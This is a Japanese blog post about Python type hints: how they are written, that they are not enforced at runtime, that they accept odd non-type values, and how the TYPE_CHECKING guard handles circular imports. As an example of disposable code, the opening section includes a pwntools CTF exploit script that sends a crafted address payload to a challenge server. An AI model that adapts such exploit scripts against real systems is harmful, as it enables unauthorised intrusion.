---
title: "Pythonの型ヒントの話"
description: "hydrogen Advent Calender 2024 day 2"
pubDate: "2024-12-02T13:21"
# update: "2024-11-19T16:00"
tags: ["hydrogen Advent Calender 2024","Python", "MyPy"]
---

この記事は[hydrogen Advent Calender 2024](https://adventar.org/calendars/10672)の2日目の記事です。

## 本題

### Pythonと型

Pythonでは簡単なプログラムを書く程度なら型というものをあまり意識しなくてもいいように設計されている。

```py
import re
from pwn import *

# サーバーに接続
io = remote('pwnctf.example.com', 9000)
result = io.recvuntil('1: ')

match = re.search(r'show_flag = (.+)', result.decode())
show_flag_address = match.group(1).strip()
print(show_flag_address)

show_flag_address = int(show_flag_address, 16) + 0x08

little = show_flag_address.to_bytes((show_flag_address.bit_length() + 7) // 8, byteorder='little')
# ペイロードを構築
payload = little + b" a"

io.sendline("a")
io.recvuntil(': ')
io.sendline("1")
io.recvuntil(': ')
io.sendline("1")

io.recvuntil('2: ')
io.sendline("b")
io.recvuntil(': ')
io.sendline("2")
io.recvuntil(': ')
io.sendline("2")

io.recvuntil('3: ')
io.sendline("c")
io.recvuntil(': ')
io.sendline("3")
io.recvuntil(': ')
io.sendline("3")

io.recvuntil('4: ')
io.sendline(payload)
io.recvuntil(': ')
io.sendline("+")
io.recvuntil(': ')
io.sendline("+")

print(io.recvall(timeout=10))
```

それゆえに、こういったCTFのpwnableで使うような書き捨てのコードなどを記述するのに向いた言語であるといえる。だが同時に、少しコードの規模が大きくなるとこの点が問題になってくる。

### 型ヒント

Pythonは次のような文法で関数や変数に型ヒントをつけることができる。

```py
#定数・変数
SAMPLE: int = 3

#関数
def some_process(some_arg: int, some_str: str) -> list[int]:
    pass
```

ただ、これはあくまでも型「ヒント」でしかなく実行時にこの型になることを強制するものではない。

そのため、例えば上の関数の`some_str`に`int`型の値を渡しても警告の一つすら出さずにそのまま動作するのである。謂わば、この型ヒントはコメントに近しいものである。

加えて言うと、この型ヒントは型である必要がないのである。そのため次のような書き方も文法上可能となる。

```py
HOGE: 3 = "HOGE"
FUGA: some_process = 4
PIYO: b"Mixed Martial Arts" = "UECMMA"
```

もはややりたい放題である。ただ、関数の呼び出しや演算などは書くことができないため、副作用のある型ヒントを書くのは極めて困難である。

この~~突っ込みどころしかない~~型ヒント機能を用いて静的型検査を行うツールとしてMyPyなどが存在する。

### 型解析ツールと面倒な仕様

実務においてはMyPyを用いて静的型検査を行うことが多いが、その際にもPythonの面倒な仕様が首をもたげる。

Pythonでは循環するimportができないのである。これ自体はある意味自然な仕様ではあるのだが、型をimportすることもできないのである。
そのため、型解析の際にのみtrueになるような定数を用いて条件分岐でimportすることで対処するのである。その際に、直接型ヒントを書くことができないため次のように記述する必要がある。

```py
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from hoge import Hoge

def fuga(hoge: 'Hoge') -> None:
    pass

def piyo(hoge: 'list[Hoge]') -> int:
    pass
```

型ヒントを文字列で書くことで、importを回避することができるのである。
